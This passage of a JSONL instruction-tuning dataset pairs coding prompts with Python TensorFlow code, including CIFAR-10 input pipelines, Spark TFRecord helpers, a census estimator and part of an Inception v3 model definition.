tf.layers.conv2d(\n      inputs=pool1,\n      filters=64,\n      kernel_size=[5, 5],\n      padding=\"same\",\n      activation=tf.nn.relu)\n\n  # Pooling Layer #2\n  # Second max pooling layer with a 2x2 filter and stride of 2\n  # Input Tensor Shape: [batch_size, 14, 14, 64]\n  # Output Tensor Shape: [batch_size, 7, 7, 64]\n  pool2 = tf.layers.max_pooling2d(inputs=conv2, pool_size=[2, 2], strides=2)\n\n  # Flatten tensor into a batch of vectors\n  # Input Tensor Shape: [batch_size, 7, 7, 64]\n  # Output Tensor Shape: [batch_size, 7 * 7 * 64]\n  pool2_flat = tf.reshape(pool2, [-1, 7 * 7 * 64])\n\n  # Dense Layer\n  # Densely connected layer with 1024 neurons\n  # Input Tensor Shape: [batch_size, 7 * 7 * 64]\n  # Output Tensor Shape: [batch_size, 1024]\n  dense = tf.layers.dense(inputs=pool2_flat, units=1024, activation=tf.nn.relu)\n\n  # Add dropout operation; 0.6 probability that element will be kept\n  dropout = tf.layers.dropout(\n      inputs=dense, rate=0.4, training=mode == tf.estimator.ModeKeys.TRAIN)\n\n  # Logits layer\n  # Input Tensor Shape: [batch_size, 1024]\n  # Output Tensor Shape: [batch_size, 10]\n  logits = tf.layers.dense(inputs=dropout, units=10)\n\n  predictions = {\n      # Generate predictions (for PREDICT and EVAL mode)\n      \"classes\": tf.argmax(input=logits, axis=1),\n      # Add `softmax_tensor` to the graph. It is used for PREDICT and by the\n      # `logging_hook`.\n      \"probabilities\": tf.nn.softmax(logits, name=\"softmax_tensor\")\n  }\n  if mode == tf.estimator.ModeKeys.PREDICT:\n    return tf.estimator.EstimatorSpec(mode=mode, predictions=predictions)\n\n  # Calculate Loss (for both TRAIN and EVAL modes)\n  loss = tf.losses.sparse_softmax_cross_entropy(labels=labels, logits=logits)\n\n  # Configure the Training Op (for TRAIN mode)\n  if mode == tf.estimator.ModeKeys.TRAIN:\n    optimizer = tf.train.GradientDescentOptimizer(learning_rate=0.001)\n    train_op = optimizer.minimize(\n        loss=loss,\n        global_step=tf.train.get_global_step())\n    return tf.estimator.EstimatorSpec(mode=mode, loss=loss, train_op=train_op)\n\n  # Add evaluation metrics (for EVAL mode)\n  eval_metric_ops = {\n      \"accuracy\": tf.metrics.accuracy(\n          labels=labels, predictions=predictions[\"classes\"])}\n  return tf.estimator.EstimatorSpec(\n      mode=mode, loss=loss, eval_metric_ops=eval_metric_ops)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreads and parses examples from CIFAR - 10 data files.", "response": "def read_cifar10(filename_queue):\n  \"\"\"Reads and parses examples from CIFAR10 data files.\n\n  Recommendation: if you want N-way read parallelism, call this function\n  N times.  This will give you N independent Readers reading different\n  files & positions within those files, which will give better mixing of\n  examples.\n\n  Args:\n    filename_queue: A queue of strings with the filenames to read from.\n\n  Returns:\n    An object representing a single example, with the following fields:\n      height: number of rows in the result (32)\n      width: number of columns in the result (32)\n      depth: number of color channels in the result (3)\n      key: a scalar string Tensor describing the filename & record number\n        for this example.\n      label: an int32 Tensor with the label in the range 0..9.\n      uint8image: a [height, width, depth] uint8 Tensor with the image data\n  \"\"\"\n\n  class CIFAR10Record(object):\n    pass\n  result = CIFAR10Record()\n\n  # Dimensions of the images in the CIFAR-10 dataset.\n  # See http://www.cs.toronto.edu/~kriz/cifar.html for a description of the\n  # input format.\n  label_bytes = 1  # 2 for CIFAR-100\n  result.height = 32\n  result.width = 32\n  result.depth = 3\n  image_bytes = result.height * result.width * result.depth\n  # Every record consists of a label followed by the image, with a\n  # fixed number of bytes for each.\n  record_bytes = label_bytes + image_bytes\n\n  # Read a record, getting filenames from the filename_queue.  No\n  # header or footer in the CIFAR-10 format, so we leave header_bytes\n  # and footer_bytes at their default of 0.\n  reader = tf.FixedLengthRecordReader(record_bytes=record_bytes)\n  result.key, value = reader.read(filename_queue)\n\n  # Convert from a string to a vector of uint8 that is record_bytes long.\n  record_bytes = tf.decode_raw(value, tf.uint8)\n\n  # The first bytes represent the label, which we convert from uint8->int32.\n  result.label = tf.cast(\n      tf.strided_slice(record_bytes, [0], [label_bytes]), tf.int32)\n\n  # The remaining bytes after the label represent the image, which we reshape\n  # from [depth * height * width] to [depth, height, width].\n  depth_major = tf.reshape(\n      tf.strided_slice(record_bytes, [label_bytes],\n                       [label_bytes + image_bytes]),\n      [result.depth, result.height, result.width])\n  # Convert from [depth, height, width] to [height, width, depth].\n  result.uint8image = tf.transpose(depth_major, [1, 2, 0])\n\n  return result"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate a queued batch of images and labels.", "response": "def _generate_image_and_label_batch(image, label, min_queue_examples,\n                                    batch_size, shuffle):\n  \"\"\"Construct a queued batch of images and labels.\n\n  Args:\n    image: 3-D Tensor of [height, width, 3] of type.float32.\n    label: 1-D Tensor of type.int32\n    min_queue_examples: int32, minimum number of samples to retain\n      in the queue that provides of batches of examples.\n    batch_size: Number of images per batch.\n    shuffle: boolean indicating whether to use a shuffling queue.\n\n  Returns:\n    images: Images. 4D tensor of [batch_size, height, width, 3] size.\n    labels: Labels. 1D tensor of [batch_size] size.\n  \"\"\"\n  # Create a queue that shuffles the examples, and then\n  # read 'batch_size' images + labels from the example queue.\n  num_preprocess_threads = 16\n  if shuffle:\n    images, label_batch = tf.train.shuffle_batch(\n        [image, label],\n        batch_size=batch_size,\n        num_threads=num_preprocess_threads,\n        capacity=min_queue_examples + 3 * batch_size,\n        min_after_dequeue=min_queue_examples)\n  else:\n    images, label_batch = tf.train.batch(\n        [image, label],\n        batch_size=batch_size,\n        num_threads=num_preprocess_threads,\n        capacity=min_queue_examples + 3 * batch_size)\n\n  # Display the training images in the visualizer.\n  tf.summary.image('images', images)\n\n  return images, tf.reshape(label_batch, [batch_size])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconstructing distorted input for CIFAR training using the Reader ops.", "response": "def distorted_inputs(data_dir, batch_size):\n  \"\"\"Construct distorted input for CIFAR training using the Reader ops.\n\n  Args:\n    data_dir: Path to the CIFAR-10 data directory.\n    batch_size: Number of images per batch.\n\n  Returns:\n    images: Images. 4D tensor of [batch_size, IMAGE_SIZE, IMAGE_SIZE, 3] size.\n    labels: Labels. 1D tensor of [batch_size] size.\n  \"\"\"\n  filenames = [os.path.join(data_dir, 'data_batch_%d.bin' % i)\n               for i in xrange(1, 6)]\n  for f in filenames:\n    if not tf.gfile.Exists(f):\n      raise ValueError('Failed to find file: ' + f)\n\n  # Create a queue that produces the filenames to read.\n  filename_queue = tf.train.string_input_producer(filenames)\n\n  # Read examples from files in the filename queue.\n  read_input = read_cifar10(filename_queue)\n  reshaped_image = tf.cast(read_input.uint8image, tf.float32)\n\n  height = IMAGE_SIZE\n  width = IMAGE_SIZE\n\n  # Image processing for training the network. Note the many random\n  # distortions applied to the image.\n\n  # Randomly crop a [height, width] section of the image.\n  distorted_image = tf.random_crop(reshaped_image, [height, width, 3])\n\n  # Randomly flip the image horizontally.\n  distorted_image = tf.image.random_flip_left_right(distorted_image)\n\n  # Because these operations are not commutative, consider randomizing\n  # the order their operation.\n  distorted_image = tf.image.random_brightness(distorted_image,\n                                               max_delta=63)\n  distorted_image = tf.image.random_contrast(distorted_image,\n                                             lower=0.2, upper=1.8)\n\n  # Subtract off the mean and divide by the variance of the pixels.\n  float_image = tf.image.per_image_standardization(distorted_image)\n\n  # Set the shapes of tensors.\n  float_image.set_shape([height, width, 3])\n  read_input.label.set_shape([1])\n\n  # Ensure that the random shuffling has good mixing properties.\n  min_fraction_of_examples_in_queue = 0.4\n  min_queue_examples = int(NUM_EXAMPLES_PER_EPOCH_FOR_TRAIN *\n                           min_fraction_of_examples_in_queue)\n  print ('Filling queue with %d CIFAR images before starting to train. '\n         'This will take a few minutes.' % min_queue_examples)\n\n  # Generate a batch of images and labels by building up a queue of examples.\n  return _generate_image_and_label_batch(float_image, read_input.label,\n                                         min_queue_examples, batch_size,\n                                         shuffle=True)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconstruct input for CIFAR evaluation using the Reader ops.", "response": "def inputs(eval_data, data_dir, batch_size):\n  \"\"\"Construct input for CIFAR evaluation using the Reader ops.\n\n  Args:\n    eval_data: bool, indicating if one should use the train or eval data set.\n    data_dir: Path to the CIFAR-10 data directory.\n    batch_size: Number of images per batch.\n\n  Returns:\n    images: Images. 4D tensor of [batch_size, IMAGE_SIZE, IMAGE_SIZE, 3] size.\n    labels: Labels. 1D tensor of [batch_size] size.\n  \"\"\"\n  if not eval_data:\n    filenames = [os.path.join(data_dir, 'data_batch_%d.bin' % i)\n                 for i in xrange(1, 6)]\n    num_examples_per_epoch = NUM_EXAMPLES_PER_EPOCH_FOR_TRAIN\n  else:\n    filenames = [os.path.join(data_dir, 'test_batch.bin')]\n    num_examples_per_epoch = NUM_EXAMPLES_PER_EPOCH_FOR_EVAL\n\n  for f in filenames:\n    if not tf.gfile.Exists(f):\n      raise ValueError('Failed to find file: ' + f)\n\n  # Create a queue that produces the filenames to read.\n  filename_queue = tf.train.string_input_producer(filenames)\n\n  # Read examples from files in the filename queue.\n  read_input = read_cifar10(filename_queue)\n  reshaped_image = tf.cast(read_input.uint8image, tf.float32)\n\n  height = IMAGE_SIZE\n  width = IMAGE_SIZE\n\n  # Image processing for evaluation.\n  # Crop the central [height, width] of the image.\n  resized_image = tf.image.resize_image_with_crop_or_pad(reshaped_image,\n                                                         height, width)\n\n  # Subtract off the mean and divide by the variance of the pixels.\n  float_image = tf.image.per_image_standardization(resized_image)\n\n  # Set the shapes of tensors.\n  float_image.set_shape([height, width, 3])\n  read_input.label.set_shape([1])\n\n  # Ensure that the random shuffling has good mixing properties.\n  min_fraction_of_examples_in_queue = 0.4\n  min_queue_examples = int(num_examples_per_epoch *\n                           min_fraction_of_examples_in_queue)\n\n  # Generate a batch of images and labels by building up a queue of examples.\n  return _generate_image_and_label_batch(float_image, read_input.label,\n                                         min_queue_examples, batch_size,\n                                         shuffle=False)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsaves a Spark DataFrame as TFRecords.", "response": "def saveAsTFRecords(df, output_dir):\n  \"\"\"Save a Spark DataFrame as TFRecords.\n\n  This will convert the DataFrame rows to TFRecords prior to saving.\n\n  Args:\n    :df: Spark DataFrame\n    :output_dir: Path to save TFRecords\n  \"\"\"\n  tf_rdd = df.rdd.mapPartitions(toTFExample(df.dtypes))\n  tf_rdd.saveAsNewAPIHadoopFile(output_dir, \"org.tensorflow.hadoop.io.TFRecordFileOutputFormat\",\n                                keyClass=\"org.apache.hadoop.io.BytesWritable\",\n                                valueClass=\"org.apache.hadoop.io.NullWritable\")"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef loadTFRecords(sc, input_dir, binary_features=[]):\n  import tensorflow as tf\n\n  tfr_rdd = sc.newAPIHadoopFile(input_dir, \"org.tensorflow.hadoop.io.TFRecordFileInputFormat\",\n                                keyClass=\"org.apache.hadoop.io.BytesWritable\",\n                                valueClass=\"org.apache.hadoop.io.NullWritable\")\n\n  # infer Spark SQL types from tf.Example\n  record = tfr_rdd.take(1)[0]\n  example = tf.train.Example()\n  example.ParseFromString(bytes(record[0]))\n  schema = infer_schema(example, binary_features)\n\n  # convert serialized protobuf to tf.Example to Row\n  example_rdd = tfr_rdd.mapPartitions(lambda x: fromTFExample(x, binary_features))\n\n  # create a Spark DataFrame from RDD[Row]\n  df = example_rdd.toDF(schema)\n\n  # save reference of this dataframe\n  loadedDF[df] = input_dir\n  return df", "response": "Load TFRecords from disk into a Spark DataFrame."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef infer_schema(example, binary_features=[]):\n  def _infer_sql_type(k, v):\n    # special handling for binary features\n    if k in binary_features:\n      return BinaryType()\n\n    if v.int64_list.value:\n      result = v.int64_list.value\n      sql_type = LongType()\n    elif v.float_list.value:\n      result = v.float_list.value\n      sql_type = DoubleType()\n    else:\n      result = v.bytes_list.value\n      sql_type = StringType()\n\n    if len(result) > 1:             # represent multi-item tensors as Spark SQL ArrayType() of base types\n      return ArrayType(sql_type)\n    else:                           # represent everything else as base types (and empty tensors as StringType())\n      return sql_type\n\n  return StructType([StructField(k, _infer_sql_type(k, v), True) for k, v in sorted(example.features.feature.items())])", "response": "Given a tf. train. Example infer the Spark DataFrame schema."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef build_estimator(model_dir, model_type, model_column_fn, inter_op, intra_op, ctx):\n  wide_columns, deep_columns = model_column_fn()\n  hidden_units = [100, 75, 50, 25]\n\n  # Create a tf.estimator.RunConfig to ensure the model is run on CPU, which\n  # trains faster than GPU for this model.\n  # Note: adding device_filter to fix: https://github.com/tensorflow/tensorflow/issues/21745\n  run_config = tf.estimator.RunConfig().replace(\n      session_config=tf.ConfigProto(device_count={'GPU': 0},\n                                    device_filters=['/job:ps', '/job:%s/task:%d' % (ctx.job_name, ctx.task_index)],\n                                    inter_op_parallelism_threads=inter_op,\n                                    intra_op_parallelism_threads=intra_op))\n\n  if model_type == 'wide':\n    return tf.estimator.LinearClassifier(\n        model_dir=model_dir,\n        feature_columns=wide_columns,\n        config=run_config)\n  elif model_type == 'deep':\n    return tf.estimator.DNNClassifier(\n        model_dir=model_dir,\n        feature_columns=deep_columns,\n        hidden_units=hidden_units,\n        config=run_config)\n  else:\n    return tf.estimator.DNNLinearCombinedClassifier(\n        model_dir=model_dir,\n        linear_feature_columns=wide_columns,\n        dnn_feature_columns=deep_columns,\n        dnn_hidden_units=hidden_units,\n        config=run_config)", "response": "Build an estimator appropriate for the given model type."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct all necessary functions and call run_loop.", "response": "def run_census(flags_obj, ctx):\n  \"\"\"Construct all necessary functions and call run_loop.\n\n  Args:\n    flags_obj: Object containing user specified flags.\n  \"\"\"\n  train_file = os.path.join(flags_obj.data_dir, census_dataset.TRAINING_FILE)\n  test_file = os.path.join(flags_obj.data_dir, census_dataset.EVAL_FILE)\n\n  # Train and evaluate the model every `flags.epochs_between_evals` epochs.\n  def train_input_fn():\n    return census_dataset.input_fn(\n        train_file, flags_obj.epochs_between_evals, True, flags_obj.batch_size)\n\n  def eval_input_fn():\n    return census_dataset.input_fn(test_file, 1, False, flags_obj.batch_size)\n\n  tensors_to_log = {\n      'average_loss': '{loss_prefix}head/truediv',\n      'loss': '{loss_prefix}head/weighted_loss/Sum'\n  }\n\n  # Removing run_loop, since we can only invoke train_and_evaluate once\n  model_helpers.apply_clean(flags.FLAGS)\n  model = build_estimator(\n      model_dir=flags_obj.model_dir, model_type=flags_obj.model_type,\n      model_column_fn=census_dataset.build_model_columns,\n      inter_op=flags_obj.inter_op_parallelism_threads,\n      intra_op=flags_obj.intra_op_parallelism_threads,\n      ctx=ctx)\n\n  loss_prefix = LOSS_PREFIX.get(flags_obj.model_type, '')\n  tensors_to_log = {k: v.format(loss_prefix=loss_prefix)\n                    for k, v in tensors_to_log.items()}\n  train_hooks = hooks_helper.get_train_hooks(\n      flags_obj.hooks, model_dir=flags_obj.model_dir,\n      batch_size=flags_obj.batch_size, tensors_to_log=tensors_to_log)\n\n  # Note: this will only be invoked once, so `--epochs_between_evals` is now effectively `--train_epochs`\n  # and evaluation will only execute once.\n  train_spec = tf.estimator.TrainSpec(input_fn=train_input_fn, hooks=train_hooks)\n  eval_spec = tf.estimator.EvalSpec(input_fn=eval_input_fn)\n  tf.estimator.train_and_evaluate(model, train_spec, eval_spec)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef inception_v3(inputs,\n                 dropout_keep_prob=0.8,\n                 num_classes=1000,\n                 is_training=True,\n                 restore_logits=True,\n                 scope=''):\n  \"\"\"Latest Inception from http://arxiv.org/abs/1512.00567.\n\n    \"Rethinking the Inception Architecture for Computer Vision\"\n\n    Christian Szegedy, Vincent Vanhoucke, Sergey Ioffe, Jonathon Shlens,\n    Zbigniew Wojna\n\n  Args:\n    inputs: a tensor of size [batch_size, height, width, channels].\n    dropout_keep_prob: dropout keep_prob.\n    num_classes: number of predicted classes.\n    is_training: whether is training or not.\n    restore_logits: whether or not the logits layers should be restored.\n      Useful for fine-tuning a model with different num_classes.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    a list containing 'logits', 'aux_logits' Tensors.\n  \"\"\"\n  # end_points will collect relevant activations for external use, for example\n  # summaries or losses.\n  end_points = {}\n  with tf.name_scope(scope, 'inception_v3', [inputs]):\n    with scopes.arg_scope([ops.conv2d, ops.fc, ops.batch_norm, ops.dropout],\n                          is_training=is_training):\n      with scopes.arg_scope([ops.conv2d, ops.max_pool, ops.avg_pool],\n                            stride=1, padding='VALID'):\n        # 299 x 299 x 3\n        end_points['conv0'] = ops.conv2d(inputs, 32, [3, 3], stride=2,\n                                         scope='conv0')\n        # 149 x 149 x 32\n        end_points['conv1'] = ops.conv2d(end_points['conv0'], 32, [3, 3],\n                                         scope='conv1')\n        # 147 x 147 x 32\n        end_points['conv2'] = ops.conv2d(end_points['conv1'], 64, [3, 3],\n                                         padding='SAME', scope='conv2')\n        # 147 x 147 x 64\n        end_points['pool1'] = ops.max_pool(end_points['conv2'], [3, 3],\n                                           stride=2, scope='pool1')\n        # 73 x 73 x 64\n        end_points['conv3'] = ops.conv2d(end_points['pool1'], 80, [1, 1],\n                                         scope='conv3')\n        # 73 x 73 x 80.\n        end_points['conv4'] = ops.conv2d(end_points['conv3'], 192, [3, 3],\n                                         scope='conv4')\n        # 71 x 71 x 192.\n        end_points['pool2'] = ops.max_pool(end_points['conv4'], [3, 3],\n                                           stride=2, scope='pool2')\n        # 35 x 35 x 192.\n        net = end_points['pool2']\n      # Inception blocks\n      with scopes.arg_scope([ops.conv2d, ops.max_pool, ops.avg_pool],\n                            stride=1, padding='SAME'):\n        # mixed: 35 x 35 x 256.\n        with tf.variable_scope('mixed_35x35x256a'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 64, [1, 1])\n          with tf.variable_scope('branch5x5'):\n            branch5x5 = ops.conv2d(net, 48, [1, 1])\n            branch5x5 = ops.conv2d(branch5x5, 64, [5, 5])\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 64, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 32, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch5x5, branch3x3dbl, branch_pool])\n          end_points['mixed_35x35x256a'] = net\n        # mixed_1: 35 x 35 x 288.\n        with tf.variable_scope('mixed_35x35x288a'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 64, [1, 1])\n          with tf.variable_scope('branch5x5'):\n            branch5x5 = ops.conv2d(net, 48, [1, 1])\n            branch5x5 = ops.conv2d(branch5x5, 64, [5, 5])\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 64, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 64, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch5x5, branch3x3dbl, branch_pool])\n          end_points['mixed_35x35x288a'] = net\n        # mixed_2: 35 x 35 x 288.\n        with tf.variable_scope('mixed_35x35x288b'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 64, [1, 1])\n          with tf.variable_scope('branch5x5'):\n            branch5x5 = ops.conv2d(net, 48, [1, 1])\n            branch5x5 = ops.conv2d(branch5x5, 64, [5, 5])\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 64, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 64, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch5x5, branch3x3dbl, branch_pool])\n          end_points['mixed_35x35x288b'] = net\n        # mixed_3: 17 x 17 x 768.\n        with tf.variable_scope('mixed_17x17x768a'):\n          with tf.variable_scope('branch3x3'):\n            branch3x3 = ops.conv2d(net, 384, [3, 3], stride=2, padding='VALID')\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 64, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 96, [3, 3],\n                                      stride=2, padding='VALID')\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.max_pool(net, [3, 3], stride=2, padding='VALID')\n          net = tf.concat(axis=3, values=[branch3x3, branch3x3dbl, branch_pool])\n          end_points['mixed_17x17x768a'] = net\n        # mixed4: 17 x 17 x 768.\n        with tf.variable_scope('mixed_17x17x768b'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 192, [1, 1])\n          with tf.variable_scope('branch7x7'):\n            branch7x7 = ops.conv2d(net, 128, [1, 1])\n            branch7x7 = ops.conv2d(branch7x7, 128, [1, 7])\n            branch7x7 = ops.conv2d(branch7x7, 192, [7, 1])\n          with tf.variable_scope('branch7x7dbl'):\n            branch7x7dbl = ops.conv2d(net, 128, [1, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 128, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 128, [1, 7])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 128, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [1, 7])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch7x7, branch7x7dbl, branch_pool])\n          end_points['mixed_17x17x768b'] = net\n        # mixed_5: 17 x 17 x 768.\n        with tf.variable_scope('mixed_17x17x768c'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 192, [1, 1])\n          with tf.variable_scope('branch7x7'):\n            branch7x7 = ops.conv2d(net, 160, [1, 1])\n            branch7x7 = ops.conv2d(branch7x7, 160, [1, 7])\n            branch7x7 = ops.conv2d(branch7x7, 192, [7, 1])\n          with tf.variable_scope('branch7x7dbl'):\n            branch7x7dbl = ops.conv2d(net, 160, [1, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [1, 7])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [1, 7])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch7x7, branch7x7dbl, branch_pool])\n          end_points['mixed_17x17x768c'] = net\n        # mixed_6: 17 x 17 x 768.\n        with tf.variable_scope('mixed_17x17x768d'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 192, [1, 1])\n          with tf.variable_scope('branch7x7'):\n            branch7x7 = ops.conv2d(net, 160, [1, 1])\n            branch7x7 = ops.conv2d(branch7x7, 160, [1, 7])\n            branch7x7 = ops.conv2d(branch7x7, 192, [7, 1])\n          with tf.variable_scope('branch7x7dbl'):\n            branch7x7dbl = ops.conv2d(net, 160, [1, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [1, 7])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 160, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [1, 7])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch7x7, branch7x7dbl, branch_pool])\n          end_points['mixed_17x17x768d'] = net\n        # mixed_7: 17 x 17 x 768.\n        with tf.variable_scope('mixed_17x17x768e'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 192, [1, 1])\n          with tf.variable_scope('branch7x7'):\n            branch7x7 = ops.conv2d(net, 192, [1, 1])\n            branch7x7 = ops.conv2d(branch7x7, 192, [1, 7])\n            branch7x7 = ops.conv2d(branch7x7, 192, [7, 1])\n          with tf.variable_scope('branch7x7dbl'):\n            branch7x7dbl = ops.conv2d(net, 192, [1, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [1, 7])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [7, 1])\n            branch7x7dbl = ops.conv2d(branch7x7dbl, 192, [1, 7])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch7x7, branch7x7dbl, branch_pool])\n          end_points['mixed_17x17x768e'] = net\n        # Auxiliary Head logits\n        aux_logits = tf.identity(end_points['mixed_17x17x768e'])\n        with tf.variable_scope('aux_logits'):\n          aux_logits = ops.avg_pool(aux_logits, [5, 5], stride=3,\n                                    padding='VALID')\n          aux_logits = ops.conv2d(aux_logits, 128, [1, 1], scope='proj')\n          # Shape of feature map before the final layer.\n          shape = aux_logits.get_shape()\n          aux_logits = ops.conv2d(aux_logits, 768, shape[1:3], stddev=0.01,\n                                  padding='VALID')\n          aux_logits = ops.flatten(aux_logits)\n          aux_logits = ops.fc(aux_logits, num_classes, activation=None,\n                              stddev=0.001, restore=restore_logits)\n          end_points['aux_logits'] = aux_logits\n        # mixed_8: 8 x 8 x 1280.\n        # Note that the scope below is not changed to not void previous\n        # checkpoints.\n        # (TODO) Fix the scope when appropriate.\n        with tf.variable_scope('mixed_17x17x1280a'):\n          with tf.variable_scope('branch3x3'):\n            branch3x3 = ops.conv2d(net, 192, [1, 1])\n            branch3x3 = ops.conv2d(branch3x3, 320, [3, 3], stride=2,\n                                   padding='VALID')\n          with tf.variable_scope('branch7x7x3'):\n            branch7x7x3 = ops.conv2d(net, 192, [1, 1])\n            branch7x7x3 = ops.conv2d(branch7x7x3, 192, [1, 7])\n            branch7x7x3 = ops.conv2d(branch7x7x3, 192, [7, 1])\n            branch7x7x3 = ops.conv2d(branch7x7x3, 192, [3, 3],\n                                     stride=2, padding='VALID')\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.max_pool(net, [3, 3], stride=2, padding='VALID')\n          net = tf.concat(axis=3, values=[branch3x3, branch7x7x3, branch_pool])\n          end_points['mixed_17x17x1280a'] = net\n        # mixed_9: 8 x 8 x 2048.\n        with tf.variable_scope('mixed_8x8x2048a'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 320, [1, 1])\n          with tf.variable_scope('branch3x3'):\n            branch3x3 = ops.conv2d(net, 384, [1, 1])\n            branch3x3 = tf.concat(axis=3, values=[ops.conv2d(branch3x3, 384, [1, 3]),\n                                                  ops.conv2d(branch3x3, 384, [3, 1])])\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 448, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 384, [3, 3])\n            branch3x3dbl = tf.concat(axis=3, values=[ops.conv2d(branch3x3dbl, 384, [1, 3]),\n                                                     ops.conv2d(branch3x3dbl, 384, [3, 1])])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch3x3, branch3x3dbl, branch_pool])\n          end_points['mixed_8x8x2048a'] = net\n        # mixed_10: 8 x 8 x 2048.\n        with tf.variable_scope('mixed_8x8x2048b'):\n          with tf.variable_scope('branch1x1'):\n            branch1x1 = ops.conv2d(net, 320, [1, 1])\n          with tf.variable_scope('branch3x3'):\n            branch3x3 = ops.conv2d(net, 384, [1, 1])\n            branch3x3 = tf.concat(axis=3, values=[ops.conv2d(branch3x3, 384, [1, 3]),\n                                                  ops.conv2d(branch3x3, 384, [3, 1])])\n          with tf.variable_scope('branch3x3dbl'):\n            branch3x3dbl = ops.conv2d(net, 448, [1, 1])\n            branch3x3dbl = ops.conv2d(branch3x3dbl, 384, [3, 3])\n            branch3x3dbl = tf.concat(axis=3, values=[ops.conv2d(branch3x3dbl, 384, [1, 3]),\n                                                     ops.conv2d(branch3x3dbl, 384, [3, 1])])\n          with tf.variable_scope('branch_pool'):\n            branch_pool = ops.avg_pool(net, [3, 3])\n            branch_pool = ops.conv2d(branch_pool, 192, [1, 1])\n          net = tf.concat(axis=3, values=[branch1x1, branch3x3, branch3x3dbl, branch_pool])\n          end_points['mixed_8x8x2048b'] = net\n        # Final pooling and prediction\n        with tf.variable_scope('logits'):\n          shape = net.get_shape()\n          net = ops.avg_pool(net, 